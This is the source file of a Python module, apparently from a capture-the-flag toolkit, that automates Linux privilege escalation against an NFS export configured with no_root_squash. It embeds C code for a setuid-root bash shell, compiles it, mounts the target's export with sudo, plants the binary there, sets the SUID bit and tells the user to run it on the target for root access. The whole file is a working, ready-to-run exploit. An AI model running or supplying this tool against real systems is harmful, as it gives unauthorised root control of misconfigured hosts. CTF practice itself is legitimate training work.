"""
CTFKit - Linux PrivEsc
NFS no_root_squash (SUID Shell)
"""

import shutil
import subprocess
import tempfile
from pathlib import Path

from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()


SHELL_SOURCE = r"""
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
"""


def run_cmd(cmd):

    console.print(
        Syntax(
            "$ " + " ".join(cmd),
            "bash",
            theme="monokai"
        )
    )

    result = subprocess.run(
        cmd,
        text=True,
        capture_output=True
    )

    if result.returncode != 0:

        if result.stderr.strip():
            console.print(
                f"[red]{result.stderr.strip()}[/red]"
            )

        raise RuntimeError(
            f"Command failed: {' '.join(cmd)}"
        )

    return result


def run(data, cred, args):

    if not args.extra:

        console.print(
            "[red][-] Usage: ctf privesc.linux.nfs.shell <export>[/red]"
        )
        return

    export = args.extra[0]

    ip = data.get("ip")

    if not ip:

        ip = input(
            "Target IP: "
        ).strip()

        if not ip:

            console.print(
                "[red][-] No target IP provided.[/red]"
            )
            return

    console.print(
        Panel.fit(
            "[bold cyan]NFS no_root_squash[/bold cyan]\n\n"
            f"Target : {ip}\n"
            f"Export : {export}",
            border_style="cyan"
        )
    )

    workspace = Path(
        tempfile.mkdtemp(prefix="ctfkit_nfs_")
    )

    shell_c = workspace / "shell.c"
    shell = workspace / "shell"

    mount_dir = workspace / "mount"

    mount_dir.mkdir()

    mounted = False

    try:

        #
        # Create source
        #
        shell_c.write_text(SHELL_SOURCE)

        #
        # Compile
        #
        run_cmd([
            "gcc",
            str(shell_c),
            "-o",
            str(shell)
        ])

        #
        # Mount
        #
        run_cmd([
            "sudo",
            "mount",
            "-t",
            "nfs",
            f"{ip}:{export}",
            str(mount_dir)
        ])

        mounted = True

        #
        # Copy shell
        #
        run_cmd([
            "cp",
            str(shell),
            str(mount_dir)
        ])

        #
        # SUID
        #
        run_cmd([
            "chmod",
            "u+s",
            str(mount_dir / "shell")
        ])

    finally:

        if mounted:

            try:

                run_cmd([
                    "sudo",
                    "umount",
                    str(mount_dir)
                ])

            except Exception:
                pass

        shutil.rmtree(
            workspace,
            ignore_errors=True
        )

    console.print()

    console.print(
        Panel.fit(
            "[bold green]Done[/bold green]\n\n"
            "Execute on the target:\n\n"
            f"{export}/shell",
            border_style="green"
        )
    )
